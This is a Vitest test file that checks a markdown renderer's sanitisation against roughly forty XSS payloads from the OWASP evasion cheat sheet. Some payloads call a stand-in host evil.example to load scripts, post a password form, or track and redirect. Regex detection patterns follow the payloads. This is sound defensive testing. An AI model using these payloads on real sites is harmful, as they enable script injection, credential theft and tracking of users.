import { describe, expect, it } from "vitest";
import { renderMarkdown } from "./markdown";

/** A corpus of XSS payloads (OWASP filter-evasion cheat sheet and common variants). */
const XSS = [
  "<script>alert(1)</script>",
  "<SCRIPT SRC=https://evil.example/x.js></SCRIPT>",
  "<img src=x onerror=alert(1)>",
  '<img src="javascript:alert(1)">',
  "<svg onload=alert(1)>",
  "<svg><script>alert(1)</script></svg>",
  "<body onload=alert(1)>",
  "<iframe src=javascript:alert(1)></iframe>",
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<a href="javascript:alert(1)">x</a>',
  '<a href="JaVaScRiPt:alert(1)">x</a>',
  '<a href="java&#x09;script:alert(1)">x</a>',
  '<a href="&#106;avascript:alert(1)">x</a>',
  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
  '<a href="vbscript:msgbox(1)">x</a>',
  "[click](javascript:alert(1))",
  "[click](JAVASCRIPT:alert(1))",
  "[click](data:text/html,<script>alert(1)</script>)",
  '[click](https://ok.example "title" onmouseover=alert(1))',
  "![x](https://evil.example/track.png)",
  "![x](javascript:alert(1))",
  '<div style="background:url(javascript:alert(1))">x</div>',
  "<style>body{display:none}</style>",
  '<link rel="stylesheet" href="https://evil.example/x.css">',
  '<meta http-equiv="refresh" content="0;url=https://evil.example">',
  '<form action="https://evil.example"><input name="password"></form>',
  "<object data=javascript:alert(1)></object>",
  "<embed src=javascript:alert(1)>",
  "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
  "<details open ontoggle=alert(1)>",
  "<video><source onerror=alert(1)></video>",
  '<p onclick="alert(1)">hello</p>',
  '<a href="https://ok.example" onclick="alert(1)">ok</a>',
  '<base href="https://evil.example/">',
  "<<script>alert(1)//<</script>",
  "<scr<script>ipt>alert(1)</scr</script>ipt>",
  "`<script>alert(1)</script>`",
  "```\n<script>alert(1)</script>\n```",
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
  '<a href="//evil.example">protocol-relative</a>',
];

/** Tags that must never appear, and attributes that run code or leave the allowed schemes. */
const DANGEROUS_TAG =
  /<(script|iframe|img|svg|style|link|meta|form|input|object|embed|base|video|details|noscript)\b/i;
const DANGEROUS_ATTRIBUTE = /<[a-z][^>]*\s(on\w+|style|src|srcdoc)\s*=|href="(?!https?:|mailto:)/i;

describe("renderMarkdown", () => {
  it.each(XSS)("neutralises %s", (payload) => {
    const html = renderMarkdown(payload);
    expect(html).not.toMatch(DANGEROUS_TAG);
    expect(html).not.toMatch(DANGEROUS_ATTRIBUTE);
  });

  it("keeps ordinary formatting, lists, code and safe links", () => {
    const html = renderMarkdown(
      "# Week 1\n\n**Read** *John 1* and `notes`.\n\n- one\n- two\n\n> quote\n\n[Bible](https://www.biblegateway.com/)",
    );
    expect(html).toContain("<h2>Week 1</h2>");
    expect(html).toContain("<strong>Read</strong> <em>John 1</em> and <code>notes</code>.");
    expect(html).toContain("<ul>\n<li>one</li>\n<li>two</li>\n</ul>");
    expect(html).toContain("<blockquote>");
    expect(html).toContain(
      '<a href="https://www.biblegateway.com/" rel="noopener noreferrer nofollow" target="_blank">Bible</a>',
    );
  });

  it("shows code as text", () => {
    expect(renderMarkdown("```\n<b>bold</b>\n```")).toContain("&lt;b&gt;bold&lt;/b&gt;");
  });

  it("drops images, which would load from elsewhere", () => {
    expect(renderMarkdown("![map](https://example.org/map.png)")).not.toContain("<img");
  });
});
